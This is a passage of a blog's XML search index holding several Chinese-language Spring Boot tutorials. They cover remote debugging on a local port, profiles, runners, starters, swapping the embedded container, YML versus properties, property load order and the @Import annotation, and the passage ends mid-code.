      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Debug%E8%B0%83%E8%AF%95%EF%BC%8C%E6%97%A5%E5%90%8E%E5%BF%85%E5%AE%9A%E6%9C%89%E7%94%A8/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Debug%E8%B0%83%E8%AF%95%EF%BC%8C%E6%97%A5%E5%90%8E%E5%BF%85%E5%AE%9A%E6%9C%89%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>最近发现 Spring Boot 本地不能 Debug 调试了，原来 Spring Boot 升级后，对应插件的命令参数都变了，故本文做一个升级。</p><p><strong>背景：</strong></p><p>Spring Boot 项目在使用 Spring Boot Maven 插件执行启动命令 <code>spring-boot:run</code> 的时候，如果设置的断点进不去，要进行以下的设置。</p><p><strong>官方解决方案：</strong></p><blockquote><p>By default, the run goal runs your application in a forked process. If you need to debug it, you should add the necessary JVM arguments to enable remote debugging. The following configuration suspend the process until a debugger has joined on port 5005:</p></blockquote><p>直接看怎么做吧！</p><h2 id="1、添加-JVM-参数"><a href="#1、添加-JVM-参数" class="headerlink" title="1、添加 JVM 参数"></a>1、添加 JVM 参数</h2><p>在插件 <code>spring-boot-maven-plugin</code> 里面加上 <code>jvmArguments</code> 配置。</p><pre class="line-numbers language-none"><code class="language-none">&lt;project&gt;  ...  &lt;build&gt;    ...    &lt;plugins&gt;      ...      &lt;plugin&gt;        &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;        &lt;version&gt;2.2.0.RELEASE&lt;&#x2F;version&gt;        &lt;configuration&gt;          &lt;jvmArguments&gt;            -Xdebug -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;y,address&#x3D;5005          &lt;&#x2F;jvmArguments&gt;        &lt;&#x2F;configuration&gt;        ...      &lt;&#x2F;plugin&gt;      ...    &lt;&#x2F;plugins&gt;    ...  &lt;&#x2F;build&gt;  ...&lt;&#x2F;project&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者在命令行指定：</p><pre class="line-numbers language-none"><code class="language-none">mvn spring-boot:run -Dspring-boot.run.jvmArguments&#x3D;&quot;-Xdebug -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;y,address&#x3D;5005&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://img.javastack.cn/20191030171505.png"></p><p>最新配置可以参考官方说明：</p><blockquote><p><a href="https://docs.spring.io/spring-boot/docs/current/maven-plugin/examples/run-debug.html">https://docs.spring.io/spring-boot/docs/current/maven-plugin/examples/run-debug.html</a></p></blockquote><h2 id="2、添加一个Remote"><a href="#2、添加一个Remote" class="headerlink" title="2、添加一个Remote"></a>2、添加一个Remote</h2><p>在开发工具里面新增一个 Remote 配置：</p><p><img src="http://img.javastack.cn/20191030170633.png"></p><p>只需要确定 Host、Port 参数即可。</p><ul><li>Host：地址</li></ul><p>localhost：本地启动地址；</p><ul><li>Port：端口</li></ul><p>5005：上面命令行指定的端口；</p><h2 id="3、开始调试"><a href="#3、开始调试" class="headerlink" title="3、开始调试"></a>3、开始调试</h2><p>先启动加了 <code>jvmArguments</code> 参数的 Spring Boot 项目：</p><p><img src="http://img.javastack.cn/20191030174448.png"></p><p>程序停在监听端口：5005，再 debug 启动Remote：</p><p><img src="http://img.javastack.cn/20191030174710.png"></p><p>再回到项目，开始启动输出日志，然后就可以进行断点调试了。</p><p>这就是远程调试了，也能帮你 debug 远程 Spring Boot 应用，但在本地调试要操作两次，略显麻烦。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Profile 配置详解</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Profile%20%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Profile%20%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Profile是什么"><a href="#Profile是什么" class="headerlink" title="Profile是什么"></a>Profile是什么</h2><p>Profile我也找不出合适的中文来定义，简单来说，Profile就是Spring Boot可以对不同环境或者指令来读取不同的配置文件。</p><h2 id="Profile使用"><a href="#Profile使用" class="headerlink" title="Profile使用"></a>Profile使用</h2><p>假如有开发、测试、生产三个不同的环境，需要定义三个不同环境下的配置。</p><h4 id="基于properties文件类型"><a href="#基于properties文件类型" class="headerlink" title="基于properties文件类型"></a>基于properties文件类型</h4><p>你可以另外建立3个环境下的配置文件：</p><p>applcation.properties<br>application-dev.properties<br>application-test.properties<br>application-prod.properties</p><p>然后在applcation.properties文件中指定当前的环境：<br>spring.profiles.active&#x3D;test<br>这时候读取的就是application-test.properties文件。</p><h4 id="基于yml文件类型"><a href="#基于yml文件类型" class="headerlink" title="基于yml文件类型"></a>基于yml文件类型</h4><p>只需要一个applcation.yml文件就能搞定，推荐此方式。</p><pre class="line-numbers language-none"><code class="language-none">spring:  profiles:     active: prod---spring:   profiles: dev    server:   port: 8080    ---spring:   profiles: test    server:   port: 8081      ---spring.profiles: prodspring.profiles.include:  - proddb  - prodmq  server:   port: 8082        ---spring:   profiles: proddb    db:  name: mysql     ---spring:   profiles: prodmq   mq:   address: localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时读取的就是prod的配置，prod包含proddb,prodmq，此时可以读取proddb,prodmq下的配置。    </p><p>也可以同时激活三个配置。</p><pre class="line-numbers language-none"><code class="language-none">spring.profiles.active: prod,proddb,prodmq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="基于Java代码"><a href="#基于Java代码" class="headerlink" title="基于Java代码"></a>基于Java代码</h4><p>在JAVA配置代码中也可以加不同Profile下定义不同的配置文件，@Profile注解只能组合使用@Configuration和@Component注解。</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@Profile(&quot;prod&quot;)public class ProductionConfiguration &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="指定Profile"><a href="#指定Profile" class="headerlink" title="指定Profile"></a>指定Profile</h2><h4 id="main方法启动方式："><a href="#main方法启动方式：" class="headerlink" title="main方法启动方式："></a>main方法启动方式：</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 在Eclipse Arguments里面添加--spring.profiles.active&#x3D;prod<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="插件启动方式："><a href="#插件启动方式：" class="headerlink" title="插件启动方式："></a>插件启动方式：</h4><pre class="line-numbers language-none"><code class="language-none">spring-boot:run -Drun.profiles&#x3D;prod<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="jar运行方式："><a href="#jar运行方式：" class="headerlink" title="jar运行方式："></a>jar运行方式：</h4><pre class="line-numbers language-none"><code class="language-none">java -jar xx.jar --spring.profiles.active&#x3D;prod<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除了在配置文件和命令行中指定Profile，还可以在启动类中写死指定，通过SpringApplication.setAdditionalProfiles方法。</p><p>SpringApplication.class</p><pre class="line-numbers language-none"><code class="language-none">public void setAdditionalProfiles(String... profiles) &#123;this.additionalProfiles &#x3D; new LinkedHashSet&lt;String&gt;(Arrays.asList(profiles));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Runner启动器</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Runner%E5%90%AF%E5%8A%A8%E5%99%A8/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Runner%E5%90%AF%E5%8A%A8%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Runner启动器"><a href="#Runner启动器" class="headerlink" title="Runner启动器"></a>Runner启动器</h2><p>如果你想在Spring Boot启动的时候运行一些特定的代码，你可以实现接口<code>ApplicationRunner</code>或者<code>CommandLineRunner</code>，这两个接口实现方式一样，它们都只提供了一个run方法。</p><p><strong>CommandLineRunner</strong>：启动获取命令行参数。</p><pre class="line-numbers language-none"><code class="language-none">public interface CommandLineRunner &#123;&#x2F;** * Callback used to run the bean. * @param args incoming main method arguments * @throws Exception on error *&#x2F;void run(String... args) throws Exception;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ApplicationRunner</strong>：启动获取应用启动的时候参数。</p><pre class="line-numbers language-none"><code class="language-none">public interface ApplicationRunner &#123;&#x2F;** * Callback used to run the bean. * @param args incoming application arguments * @throws Exception on error *&#x2F;void run(ApplicationArguments args) throws Exception;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><pre class="line-numbers language-none"><code class="language-none">import org.springframework.boot.*import org.springframework.stereotype.*@Componentpublic class MyBean implements CommandLineRunner &#123;    public void run(String... args) &#123;        &#x2F;&#x2F; Do something...    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者这样</p><pre class="line-numbers language-none"><code class="language-none">@Beanpublic CommandLineRunner init() &#123;return (String... strings) -&gt; &#123;&#125;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="启动顺序"><a href="#启动顺序" class="headerlink" title="启动顺序"></a>启动顺序</h2><p>如果启动的时候有多个ApplicationRunner和CommandLineRunner，想控制它们的启动顺序，可以实现<code>org.springframework.core.Ordered</code>接口或者使用<code>org.springframework.core.annotation.Order</code>注解。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Starters启动器</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Starters%E5%90%AF%E5%8A%A8%E5%99%A8/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Starters%E5%90%AF%E5%8A%A8%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Starters是什么？"><a href="#Starters是什么？" class="headerlink" title="Starters是什么？"></a>Starters是什么？</h2><p>Starters可以理解为启动器，它包含了一系列可以集成到应用里面的依赖包，你可以一站式集成Spring及其他技术，而不需要到处找示例代码和依赖包。如你想使用Spring JPA访问数据库，只要加入spring-boot-starter-data-jpa启动器依赖就能使用了。</p><p>Starters包含了许多项目中需要用到的依赖，它们能快速持续的运行，都是一系列得到支持的管理传递性依赖。</p><h2 id="Starters命名"><a href="#Starters命名" class="headerlink" title="Starters命名"></a>Starters命名</h2><p>Spring Boot官方的启动器都是以spring-boot-starter-<em>命名的，</em>代表了一个特定的应用类型。</p><p>第三方的启动器不能以spring-boot开头命名，它们都被Spring Boot官方保留。一般一个第三方的应该这样命名，像mybatis的mybatis-spring-boot-starter。</p><h2 id="Starters分类"><a href="#Starters分类" class="headerlink" title="Starters分类"></a>Starters分类</h2><h4 id="1-Spring-Boot应用类启动器"><a href="#1-Spring-Boot应用类启动器" class="headerlink" title="1. Spring Boot应用类启动器"></a>1. Spring Boot应用类启动器</h4><table><thead><tr><th>启动器名称</th><th>功能描述</th></tr></thead><tbody><tr><td>spring-boot-starter</td><td>包含自动配置、日志、YAML的支持。</td></tr><tr><td>spring-boot-starter-web</td><td>使用Spring MVC构建web 工程，包含restful，默认使用Tomcat容器。</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><h4 id="2-Spring-Boot生产启动器"><a href="#2-Spring-Boot生产启动器" class="headerlink" title="2. Spring Boot生产启动器"></a>2. Spring Boot生产启动器</h4><table><thead><tr><th>启动器名称</th><th>功能描述</th></tr></thead><tbody><tr><td>spring-boot-starter-actuator</td><td>提供生产环境特性，能监控管理应用。</td></tr></tbody></table><h4 id="3-Spring-Boot技术类启动器"><a href="#3-Spring-Boot技术类启动器" class="headerlink" title="3. Spring Boot技术类启动器"></a>3. Spring Boot技术类启动器</h4><table><thead><tr><th>启动器名称</th><th>功能描述</th></tr></thead><tbody><tr><td>spring-boot-starter-json</td><td>提供对JSON的读写支持。</td></tr><tr><td>spring-boot-starter-logging</td><td>默认的日志启动器，默认使用Logback。</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><h4 id="4-其他第三方启动器"><a href="#4-其他第三方启动器" class="headerlink" title="4. 其他第三方启动器"></a>4. 其他第三方启动器</h4><p>更多可以参考下面链接。</p><p><a href="https://github.com/spring-projects/spring-boot/blob/master/spring-boot-starters/README.adoc">https://github.com/spring-projects/spring-boot/blob/master/spring-boot-starters/README.adoc</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot Server容器配置</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Server%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20Server%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="参数配置容器"><a href="#参数配置容器" class="headerlink" title="参数配置容器"></a>参数配置容器</h2><p>server.xx开头的是所有servlet容器通用的配置，server.tomcat.xx开头的是tomcat特有的参数，其它类似。</p><p>所有参数绑定配置类：org.springframework.boot.autoconfigure.web.ServerProperties</p><h2 id="代码配置容器"><a href="#代码配置容器" class="headerlink" title="代码配置容器"></a>代码配置容器</h2><p>除了利用上面的参数来自动配置servlet容器，还可以通过代码的方式。可以直接实现EmbeddedServletContainerCustomizer这个接口，ServerProperties也是实现这个接口的。</p><pre class="line-numbers language-none"><code class="language-none">@ConfigurationProperties(prefix &#x3D; &quot;server&quot;, ignoreUnknownFields &#x3D; true)public class ServerPropertiesimplements EmbeddedServletContainerCustomizer, EnvironmentAware, Ordered &#123;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当然如果是Tomcat、Jetty、Undertow也可以使用下面对应的特定的容器工厂类。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; Jettyorg.springframework.boot.context.embedded.jetty.JettyEmbeddedServletContainerFactory&#x2F;&#x2F; Tomcatorg.springframework.boot.context.embedded.tomcat.TomcatEmbeddedServletContainerFactory&#x2F;&#x2F; Undertoworg.springframework.boot.context.embedded.undertow.UndertowEmbeddedServletContainerFactory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="替换Tomcat"><a href="#替换Tomcat" class="headerlink" title="替换Tomcat"></a>替换Tomcat</h2><blockquote><p>spring-boot-starter-web brings Tomcat with spring-boot-starter-tomcat, but spring-boot-starter-jetty and spring-boot-starter-undertow can be used instead.</p></blockquote><p>spring-boot-starter-web自动携带了tomcat依赖，但也可以替换成jetty和undertow，下面是一个替换jetty的示例。</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;&#x2F;artifactId&gt;    &lt;exclusions&gt;        <!-- Exclude the Tomcat dependency -->        &lt;exclusion&gt;            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;&#x2F;artifactId&gt;        &lt;&#x2F;exclusion&gt;    &lt;&#x2F;exclusions&gt;&lt;&#x2F;dependency&gt;<!-- Use Jetty instead -->&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;spring-boot-starter-jetty&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot YML 掀翻 Properties</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20YML%20%E6%8E%80%E7%BF%BB%20Properties/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20YML%20%E6%8E%80%E7%BF%BB%20Properties/</url>
      
        <content type="html"><![CDATA[<p>.properties 配置文件大家应该都很熟悉，键值对嘛，.yml 配置文件栈长也是从 Spring Boot 开始了解到的。</p><p>那么，这两种格式的配置文件到底有哪些区别呢？哪个更好？能不能替换代替？今天，栈长就来解开这些谜团，看 YML 能不能掀翻Properties。。。</p><p><strong>.properties格式：</strong></p><pre class="line-numbers language-none"><code class="language-none">spring.application.name&#x3D;register-centerspring.security.user.name&#x3D;javastackspring.security.user.password&#x3D;javastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>.yml格式：</strong></p><pre class="line-numbers language-none"><code class="language-none">spring:  application:    name: register-center  security:    user:      name: javastack      password: javastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上所示，.properties 是键值对形式，.yml 是树状结构的，配置更方便，可以直接写中文，阅读也可友好。</p><p>这还不算什么，yml最强大的是能节省很多配置，如下所示：</p><pre class="line-numbers language-none"><code class="language-none">---spring:  profiles: rc1server:  port: 8761eureka.instance.hostname: eureka1---spring:  profiles: rc2server:  port: 8762eureka.instance.hostname: eureka2---spring:  profiles: rc3server:  port: 8763eureka.instance.hostname: eureka3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上配置，yml一个配置文件就能搞定，而用 properties 则需要三个文件。<br>但在 .yml 配置文件中需要注意以下几点：</p><ul><li>键冒号后面需要带一个空格</li><li>缩进只能用空格，不能用tab</li><li>@PropertySource注解不能加载yml文件</li></ul><p>不考虑 @PropertySource 注解，栈长现在用 yml 完全可以代替 properties 配置文件，能用 yml 就不会用 properties 了，可以看这篇文章：<a href="https://mp.weixin.qq.com/s/aen2PIh0ut-BSHad-Bw7hg">Spring Boot读取配置的几种方式</a>。</p><p>当然这只是在 Spring Boot 中能完全替代，某些框架还是需要用 properties 的，如：某些日志配置文件、第三方的配置文件等。</p><p>你还知道其他的 yml 的更多玩法不，欢迎留言分享~</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 主类及目录结构介绍</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E4%B8%BB%E7%B1%BB%E5%8F%8A%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E4%B8%BB%E7%B1%BB%E5%8F%8A%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>使用 Spring Boot 会涉及到各种各样的配置，如开发、测试、线上就至少 3 套配置信息了。Spring Boot 可以轻松的帮助我们使用相同的代码就能使开发、测试、线上环境使用不同的配置。</p><p><strong>在 Spring Boot 里面，可以使用以下几种方式来加载配置。本章内容基于 Spring Boot 2.0 进行详解。</strong></p><p>1、properties文件；</p><p>2、YAML文件；</p><p>3、系统环境变量；</p><p>4、命令行参数；</p><p>等等……</p><p><strong>我们可以在 Spring Beans 里面直接使用这些配置文件中加载的值，如：</strong></p><p>1、使用 <code>@Value</code> 注解直接注入对应的值，这能获取到 Spring 中 <code>Environment</code> 的值；</p><p>2、使用 <code>@ConfigurationProperties</code> 注解把对应的值绑定到一个对象；</p><p>3、直接获取注入 <code>Environment</code> 进行获取；</p><p>配置属性的方式很多，Spring boot使用了一种独有的 <code>PropertySource</code> 可以很方便的覆盖属性的值。</p><p><strong>配置属性加载的顺序如下：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、开发者工具 &#96;Devtools&#96; 全局配置参数；2、单元测试上的 &#96;@TestPropertySource&#96; 注解指定的参数；3、单元测试上的 &#96;@SpringBootTest&#96; 注解指定的参数；4、命令行指定的参数，如 &#96;java -jar springboot.jar --name&#x3D;&quot;Java&quot;&#96;；5、命令行中的 &#96;SPRING_APPLICATION_JSONJSON&#96; 指定参数, 如 &#96;java -Dspring.application.json&#x3D;&#39;&#123;&quot;name&quot;:&quot;Java&quot;&#125;&#39; -jar springboot.jar&#96;6、&#96;ServletConfig&#96; 初始化参数；7、&#96;ServletContext&#96; 初始化参数；8、JNDI参数（如 &#96;java:comp&#x2F;env&#x2F;spring.application.json&#96;）；9、Java系统参数（来源：&#96;System.getProperties()&#96;）；10、操作系统环境变量参数；11、&#96;RandomValuePropertySource&#96; 随机数，仅匹配：&#96;ramdom.*&#96;；12、JAR包外面的配置文件参数（&#96;application-&#123;profile&#125;.properties（YAML）&#96;）13、JAR包里面的配置文件参数（&#96;application-&#123;profile&#125;.properties（YAML）&#96;）14、JAR包外面的配置文件参数（&#96;application.properties（YAML）&#96;）15、JAR包里面的配置文件参数（&#96;application.properties（YAML）&#96;）16、&#96;@Configuration&#96;配置文件上 &#96;@PropertySource&#96; 注解加载的参数；17、默认参数（通过 &#96;SpringApplication.setDefaultProperties&#96; 指定）；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数字小的优先级越高，即数字小的会覆盖数字大的参数值，我们来实践下，验证以上配置参数的加载顺序。</strong></p><p>1、在主应用程序中添加 Java 系统参数。</p><pre class="line-numbers language-none"><code class="language-none">@Beanpublic CommandLineRunner commandLineRunner() &#123;return (args) -&gt; &#123;System.setProperty(&quot;name&quot;, &quot;javastack-system-properties&quot;);&#125;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、在 application.properties 文件中添加属性。</p><pre class="line-numbers language-none"><code class="language-none">name &#x3D; javastack-application<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、在 application-dev.properties 文件中添加属性。</p><pre class="line-numbers language-none"><code class="language-none">name &#x3D; javastack-application-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、添加测试类</p><pre class="line-numbers language-none"><code class="language-none">@RunWith(SpringRunner.class)@SpringBootTest(value &#x3D; &#123; &quot;name&#x3D;javastack-test&quot;, &quot;sex&#x3D;1&quot; &#125;)@ActiveProfiles(&quot;dev&quot;)public class SpringBootBestPracticeApplicationTests &#123;@Value(&quot;$&#123;name&#125;&quot;)private String name;@Testpublic void test() &#123;System.out.println(&quot;name is &quot; + name);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行 test 单元测试，程序输出：</p><pre class="line-numbers language-none"><code class="language-none">name is javastack-test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据以上参数动态调整，发现参数会被正确被覆盖。了解了 Spring Boot 各种配置的加载顺序，如果配置被覆盖了我们就知道是什么问题了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 之配置导入，强大到不行</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E4%B9%8B%E9%85%8D%E7%BD%AE%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%BC%BA%E5%A4%A7%E5%88%B0%E4%B8%8D%E8%A1%8C/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Boot/Spring%20Boot%20%E4%B9%8B%E9%85%8D%E7%BD%AE%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%BC%BA%E5%A4%A7%E5%88%B0%E4%B8%8D%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>我们知道在 Spring Boot 中可以用一个 <code>@Configuration</code> 配置文件来配置所有 Bean 及其他配置（不会的看这篇文章：<a href="https://mp.weixin.qq.com/s/i8qHLkdtf4XzRyIRJ8R_7A">Spring零配置之@Configuration注解详解</a>），但其实没必要这么做。</p><p>我们可以把相关的配置独立出来，放到多个 <code>@Configuration</code> 中，如以下参考：</p><ul><li>MainConfiguration：项目主要配置</li><li>DataSoureceConfiguration：数据源配置</li><li>RedisConfiguration：Redis配置</li><li>MongoDBConfiguration：MongoDB配置</li></ul><p>这时候 <code>@Import</code> 注解就能派上用场了，来看下它的源码：</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface Import &#123;&#x2F;** * &#123;@link Configuration&#125;, &#123;@link ImportSelector&#125;, &#123;@link ImportBeanDefinitionRegistrar&#125; * or regular component classes to import. *&#x2F;Class&lt;?&gt;[] value();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以导入这三类注册文件：</p><ul><li>Configuration</li><li>ImportSelector</li><li>ImportBeanDefinitionRegistrar</li></ul><p>先来看一个 <code>@Import</code> 示例，直接导入其他配置文件：</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@Import(&#123; RedisConfiguration.class &#125;)public class MainConfiguration &#123;    &#x2F;&#x2F; ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然，如果这些配置文件都在类扫描路径下，不用 <code>@Import</code> 导入注解，直接用 <code>@ComponentScan</code> 也能搞定，这个默认的 <code>@SpringBootApplication</code> 注解就包含了，不需要再重复加。</p><p>再者，<code>@Enable*</code> 注解也能派上用场：</p><pre class="line-numbers language-none"><code class="language-none">@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Import(RedisConfiguration.class)public @interface EnableRedis &#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>那么问题来了，老项目想用 Spring Boot 框架，但还有大量的 XML 配置文件，很难迁移到 <code>@Configuration</code> 配置文件里面来，怎么处理？</strong></p><p>栈长继续给你支招！</p><p>答案就是：<code>@ImportResource</code> 注解，来看下它的源码：</p><pre class="line-numbers language-none"><code class="language-none">@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.TYPE)@Documentedpublic @interface ImportResource &#123;@AliasFor(&quot;locations&quot;)String[] value() default &#123;&#125;;@AliasFor(&quot;value&quot;)String[] locations() default &#123;&#125;;Class&lt;? extends BeanDefinitionReader&gt; reader() default 